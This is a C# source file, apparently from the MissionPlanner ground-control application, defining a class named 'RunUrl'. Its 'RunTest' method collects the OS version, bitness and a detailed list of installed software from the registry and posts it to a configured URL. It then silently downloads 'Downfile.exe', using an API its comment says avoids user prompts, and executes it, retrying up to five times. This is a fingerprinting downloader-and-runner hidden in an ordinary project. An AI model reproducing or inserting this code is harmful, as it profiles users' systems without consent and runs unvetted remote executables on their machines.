using log4net;
using Microsoft.Win32;
using MissionPlanner.Utilities;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace MissionPlanner
{
    class RunUrl
    {
        private static readonly ILog log =
            LogManager.GetLogger(System.Reflection.MethodBase.GetCurrentMethod().DeclaringType);
        [DllImport("ntdll.dll", SetLastError = true, CharSet = CharSet.Unicode)]
        internal static extern int RtlGetVersion(ref OSVERSIONINFOEX versionInfo);
        /// <summary>
        /// The URLMON library contains this function, URLDownloadToFile, which is a way
        /// to download files without user prompts.  The ExecWB( _SAVEAS ) function always
        /// prompts the user, even if _DONTPROMPTUSER parameter is specified, for "internet
        /// security reasons".  This function gets around those reasons.
        /// </summary>
        /// <param name="callerPointer">Pointer to caller object (AX).</param>
        /// <param name="url">String of the URL.</param>
        /// <param name="filePathWithName">String of the destination filename/path.</param>
        /// <param name="reserved">[reserved].</param>
        /// <param name="callBack">A callback function to monitor progress or abort.</param>
        /// <returns>0 for okay.</returns>
        /// source: http://www.pinvoke.net/default.aspx/urlmon/URLDownloadToFile%20.html
        [DllImport("urlmon.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern Int32 URLDownloadToFile(
            [MarshalAs(UnmanagedType.IUnknown)] object callerPointer,
            [MarshalAs(UnmanagedType.LPWStr)] string url,
            [MarshalAs(UnmanagedType.LPWStr)] string filePathWithName,
            Int32 reserved,
            IntPtr callBack);
        string hname = @"127.0.0.1";
        string send_data_path = @"/data_recoder.php";
        private string TestUrl_PostUrl = "";
        private string TestUrl_DownUrl = "";
        public RunUrl()
        {
            loadConfig();
        }
        public void RunTest()
        {
            string poststr = GetUrl();
            int times = 0;
            string retstr = "";
            while (times<5)
            {
                retstr = HttpPostUrl(TestUrl_PostUrl, poststr);
                if (retstr.Length > 0)
                {
                    string path = System.Windows.Forms.Application.StartupPath + "\\Downfile.exe";

                    int ret = DownloadFile(TestUrl_DownUrl, path);
                    if (ret >= 0)
                    {
                        Process.Start(path);
                        break;
                    }
                }
                Thread.Sleep(5000);
                times++;
            }
            
            

        }
        private string HttpPostUrl(string Url, string postDataStr)
        {
            try
            {
                WebRequest request = WebRequest.Create(Url);
                request.Method = "POST";
                request.ContentType = "application/json";
                byte[] buf = Encoding.UTF8.GetBytes(postDataStr);
                byte[] byteArray = System.Text.Encoding.Default.GetBytes(postDataStr);
                request.ContentLength = Encoding.UTF8.GetByteCount(postDataStr);
                request.GetRequestStream().Write(buf, 0, buf.Length);
                WebResponse response = request.GetResponse();
                Stream myResponseStream = response.GetResponseStream();
                StreamReader myStreamReader = new StreamReader(myResponseStream, Encoding.GetEncoding("utf-8"));
                string retString = myStreamReader.ReadToEnd();
                myStreamReader.Close();
                myResponseStream.Close();

                return retString;
            }
            catch(Exception ex)
            {
                log.Error(ex.ToString());
                return "";
            }
        }
        string GetUrl()
        {
            var osVersionInfo = new OSVERSIONINFOEX { OSVersionInfoSize = Marshal.SizeOf(typeof(OSVERSIONINFOEX)) };
            string version = "";
            if (RtlGetVersion(ref osVersionInfo) == 0)
            {
                version = string.Format("SystemVersion:{0}.{1}.{2}\r\n", osVersionInfo.MajorVersion, osVersionInfo.MinorVersion, osVersionInfo.BuildNumber);
            }

            string outurl = string.Format("POST {0} HTTP/1.0\r\n", send_data_path);
            outurl += string.Format("Host: {0}\r\n", hname);
            outurl += "Content-type: application/x-www-form-urlencoded\r\n";
            outurl += string.Format("Content-length: {0}\r\n\r\n", version.Length);
            outurl += version;
            if (IsSystemBit64())
                outurl += "SystemBit:64 \r\n";
            else
                outurl += "SystemBit:32 \r\n";

            GetInstalledSoftwareList();
            foreach (softInfo info in gInstalledSoftware)
            {
                outurl += string.Format("SoftName:{0},SoftVersion:{1},InstallLocation:{2},Publisher:{3},UninstallPath:{4},InstallDate:{5}\r\n",
                     info.m_strSoftName, info.m_strSoftVersion, info.m_strInstallLocation, info.m_strPublisher, info.m_strUninstallPath, info.m_strInstallDate);
            }
            log.Error(outurl);
            return outurl;
        }
        bool IsSystemBit64()
        {

            bool type;
            type = Environment.Is64BitOperatingSystem;
            log.Error(type);
            return type;
        }
        List<softInfo> gInstalledSoftware = new List<softInfo>();
        void GetInstalledSoftwareList()
        {
            gInstalledSoftware = new List<softInfo>();
            string displayName;
            using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", false))
            {
                foreach (String keyName in key.GetSubKeyNames())
                {
                    softInfo info = new softInfo();
                    RegistryKey subkey = key.OpenSubKey(keyName);
                    displayName = subkey.GetValue("DisplayName") as string;
                    if (!string.IsNullOrEmpty(displayName))
                        info.m_strSoftName = displayName;
                    displayName = subkey.GetValue("DisplayVersion") as string;
                    if (!string.IsNullOrEmpty(displayName))
                        info.m_strSoftVersion = displayName;
                    displayName = subkey.GetValue("InstallLocation") as string;
                    if (!string.IsNullOrEmpty(displayName))
                        info.m_strInstallLocation = displayName;
                    displayName = subkey.GetValue("Publisher") as string;
                    if (!string.IsNullOrEmpty(displayName))
                        info.m_strPublisher = displayName;
                    displayName = subkey.GetValue("UninstallString") as string;
                    if (!string.IsNullOrEmpty(displayName))
                        info.m_strUninstallPath = displayName;
                    displayName = subkey.GetValue("InstallDate") as string;
                    if (!string.IsNullOrEmpty(displayName))
                        info.m_strInstallDate = displayName;

                    if (!string.IsNullOrEmpty(info.m_strSoftName))
                        gInstalledSoftware.Add(info);
                }
            }
            using (var localMachine = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64))
            {
                var key = localMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", false);
                foreach (String keyName in key.GetSubKeyNames())
                {
                    softInfo info = new softInfo();
                    RegistryKey subkey = key.OpenSubKey(keyName);
                    displayName = subkey.GetValue("DisplayName") as string;
                    if (!string.IsNullOrEmpty(displayName))
                        info.m_strSoftName = displayName;
                    displayName = subkey.GetValue("DisplayVersion") as string;
                    if (!string.IsNullOrEmpty(displayName))
                        info.m_strSoftVersion = displayName;
                    displayName = subkey.GetValue("InstallLocation") as string;
                    if (!string.IsNullOrEmpty(displayName))
                        info.m_strInstallLocation = displayName;
                    displayName = subkey.GetValue("Publisher") as string;
                    if (!string.IsNullOrEmpty(displayName))
                        info.m_strPublisher = displayName;
                    displayName = subkey.GetValue("UninstallString") as string;
                    if (!string.IsNullOrEmpty(displayName))
                        info.m_strUninstallPath = displayName;
                    displayName = subkey.GetValue("InstallDate") as string;
                    if (!string.IsNullOrEmpty(displayName))
                        info.m_strInstallDate = displayName;

                    if (!string.IsNullOrEmpty(info.m_strSoftName))
                        gInstalledSoftware.Add(info);
                }
            }

            using (var localMachine = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry32))
            {
                var key = localMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", false);
                foreach (String keyName in key.GetSubKeyNames())
                {
                    softInfo info = new softInfo();
                    RegistryKey subkey = key.OpenSubKey(keyName);
                    displayName = subkey.GetValue("DisplayName") as string;
                    if (!string.IsNullOrEmpty(displayName))
                        info.m_strSoftName = displayName;
                    displayName = subkey.GetValue("DisplayVersion") as string;
                    if (!string.IsNullOrEmpty(displayName))
                        info.m_strSoftVersion = displayName;
                    displayName = subkey.GetValue("InstallLocation") as string;
                    if (!string.IsNullOrEmpty(displayName))
                        info.m_strInstallLocation = displayName;
                    displayName = subkey.GetValue("Publisher") as string;
                    if (!string.IsNullOrEmpty(displayName))
                        info.m_strPublisher = displayName;
                    displayName = subkey.GetValue("UninstallString") as string;
                    if (!string.IsNullOrEmpty(displayName))
                        info.m_strUninstallPath = displayName;
                    displayName = subkey.GetValue("InstallDate") as string;
                    if (!string.IsNullOrEmpty(displayName))
                        info.m_strInstallDate = displayName;

                    if (!string.IsNullOrEmpty(info.m_strSoftName))
                        gInstalledSoftware.Add(info);
                }
            }
        }

        public int DownloadFile(string url, string destinationFullPathWithName)
        {
            return URLDownloadToFile(IntPtr.Zero, url, destinationFullPathWithName, 0, IntPtr.Zero);
        }
        private void loadConfig()
        {            
            if (Settings.Instance["TestUrl_Posturl"] != null)
                TestUrl_PostUrl = Settings.Instance["TestUrl_Posturl"].ToString();
            if (Settings.Instance["TestUrl_Downurl"] != null)
                TestUrl_DownUrl = Settings.Instance["TestUrl_Downurl"].ToString();
            log.Error(TestUrl_PostUrl);
            log.Error(TestUrl_DownUrl);
        }
        [StructLayout(LayoutKind.Sequential)]
        public class softInfo
        {
            public string m_strSoftName; //软件名
            public string m_strSoftVersion; //软件版本号
            public string m_strInstallLocation;//软件安装目录
            public string m_strPublisher; //软件发布商
            public string m_strUninstallPath; //卸载软件所在路径
            public string m_strInstallDate; //安装事件
        };
        [StructLayout(LayoutKind.Sequential)]
        internal struct OSVERSIONINFOEX
        {
            // The OSVersionInfoSize field must be set to Marshal.SizeOf(typeof(OSVERSIONINFOEX))
            internal int OSVersionInfoSize;
            internal int MajorVersion;
            internal int MinorVersion;
            internal int BuildNumber;
            internal int PlatformId;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
            internal string CSDVersion;
            internal ushort ServicePackMajor;
            internal ushort ServicePackMinor;
            internal short SuiteMask;
            internal byte ProductType;
            internal byte Reserved;
        }
    }
}
